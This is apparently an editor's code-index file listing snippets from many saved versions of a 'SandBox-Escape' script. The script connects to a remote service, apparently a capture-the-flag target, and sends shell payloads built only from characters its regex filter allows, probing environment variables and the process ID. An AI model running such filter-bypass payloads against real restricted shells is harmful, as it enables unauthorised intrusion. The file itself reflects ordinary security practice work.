        "description": ".history.SandBox-Escape_20250515200002",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515200002",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200002",
        "description": ".history.SandBox-Escape_20250515200002",
        "peekOfCode": "HOST = \"111.111.111.111\" # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515200002",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200002",
        "description": ".history.SandBox-Escape_20250515200002",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515200002",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515200007",
        "description": ".history.SandBox-Escape_20250515200007",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515200007",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200007",
        "description": ".history.SandBox-Escape_20250515200007",
        "peekOfCode": "HOST = \"111.111.111.111\" # <--- Change this\nPORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515200007",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200007",
        "description": ".history.SandBox-Escape_20250515200007",
        "peekOfCode": "PORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515200007",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200007",
        "description": ".history.SandBox-Escape_20250515200007",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515200007",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515200559",
        "description": ".history.SandBox-Escape_20250515200559",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515200559",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200559",
        "description": ".history.SandBox-Escape_20250515200559",
        "peekOfCode": "HOST = \"111.111.111.111\" # <--- Change this\nPORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515200559",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200559",
        "description": ".history.SandBox-Escape_20250515200559",
        "peekOfCode": "PORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515200559",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200559",
        "description": ".history.SandBox-Escape_20250515200559",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515200559",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515200615",
        "description": ".history.SandBox-Escape_20250515200615",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515200615",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200615",
        "description": ".history.SandBox-Escape_20250515200615",
        "peekOfCode": "HOST = \"111.111.111.111\" # <--- Change this\nPORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515200615",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200615",
        "description": ".history.SandBox-Escape_20250515200615",
        "peekOfCode": "PORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515200615",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200615",
        "description": ".history.SandBox-Escape_20250515200615",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515200615",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515200908",
        "description": ".history.SandBox-Escape_20250515200908",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515200908",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200908",
        "description": ".history.SandBox-Escape_20250515200908",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515200908",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200908",
        "description": ".history.SandBox-Escape_20250515200908",
        "peekOfCode": "PORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515200908",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200908",
        "description": ".history.SandBox-Escape_20250515200908",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515200908",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515201751",
        "description": ".history.SandBox-Escape_20250515201751",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515201751",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201751",
        "description": ".history.SandBox-Escape_20250515201751",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515201751",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201751",
        "description": ".history.SandBox-Escape_20250515201751",
        "peekOfCode": "PORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515201751",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201751",
        "description": ".history.SandBox-Escape_20250515201751",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515201751",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515201910",
        "description": ".history.SandBox-Escape_20250515201910",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515201910",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201910",
        "description": ".history.SandBox-Escape_20250515201910",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515201910",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201910",
        "description": ".history.SandBox-Escape_20250515201910",
        "peekOfCode": "PORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515201910",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201910",
        "description": ".history.SandBox-Escape_20250515201910",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515201910",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515201956",
        "description": ".history.SandBox-Escape_20250515201956",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515201956",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515201956",
        "description": ".history.SandBox-Escape_20250515201956",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515201956",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515201956",
        "description": ".history.SandBox-Escape_20250515201956",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515201956",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201956",
        "description": ".history.SandBox-Escape_20250515201956",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515201956",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201956",
        "description": ".history.SandBox-Escape_20250515201956",
        "peekOfCode": "PORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515201956",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515201956",
        "description": ".history.SandBox-Escape_20250515201956",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515201956",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202226",
        "description": ".history.SandBox-Escape_20250515202226",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515202226",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202226",
        "description": ".history.SandBox-Escape_20250515202226",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515202226",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202226",
        "description": ".history.SandBox-Escape_20250515202226",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515202226",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202226",
        "description": ".history.SandBox-Escape_20250515202226",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515202226",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202226",
        "description": ".history.SandBox-Escape_20250515202226",
        "peekOfCode": "PORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515202226",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202226",
        "description": ".history.SandBox-Escape_20250515202226",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515202226",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202242",
        "description": ".history.SandBox-Escape_20250515202242",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515202242",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202242",
        "description": ".history.SandBox-Escape_20250515202242",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515202242",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202242",
        "description": ".history.SandBox-Escape_20250515202242",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515202242",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202242",
        "description": ".history.SandBox-Escape_20250515202242",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515202242",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202242",
        "description": ".history.SandBox-Escape_20250515202242",
        "peekOfCode": "PORT = 34445 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515202242",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202242",
        "description": ".history.SandBox-Escape_20250515202242",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515202242",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202304",
        "description": ".history.SandBox-Escape_20250515202304",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515202304",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202304",
        "description": ".history.SandBox-Escape_20250515202304",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.SandBox-Escape_20250515202304",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202304",
        "description": ".history.SandBox-Escape_20250515202304",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        time.sleep(0.5)  # Small delay to allow server to process\n        response = conn.recv(timeout=2).decode()\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.SandBox-Escape_20250515202304",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202304",
        "description": ".history.SandBox-Escape_20250515202304",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the bashpoke tool.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        return\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)",
        "detail": ".history.SandBox-Escape_20250515202304",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202304",
        "description": ".history.SandBox-Escape_20250515202304",
        "peekOfCode": "HOST = \"94.237.123.126\" # <--- Change this\nPORT = 34445 # <--- Change this\nimport os\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)",
        "detail": ".history.SandBox-Escape_20250515202304",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202304",
        "description": ".history.SandBox-Escape_20250515202304",
        "peekOfCode": "PORT = 34445 # <--- Change this\nimport os\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\ndef load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:",
        "detail": ".history.SandBox-Escape_20250515202304",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515202304",
        "description": ".history.SandBox-Escape_20250515202304",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515202304",
        "documentation": {}
    },
    {
        "label": "load_payloads_from_directory",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202329",
        "description": ".history.SandBox-Escape_20250515202329",
        "peekOfCode": "def load_payloads_from_directory(directory):\n    \"\"\"Loads payloads from all .txt files in a given directory.\"\"\"\n    all_payloads = []\n    for filename in os.listdir(directory):\n        if filename.endswith(\".txt\"):\n            filepath = os.path.join(directory, filename)\n            try:\n                with open(filepath, 'r') as f:\n                    payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]\n                    all_payloads.extend(payloads)",
        "detail": ".history.SandBox-Escape_20250515202329",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515202329",
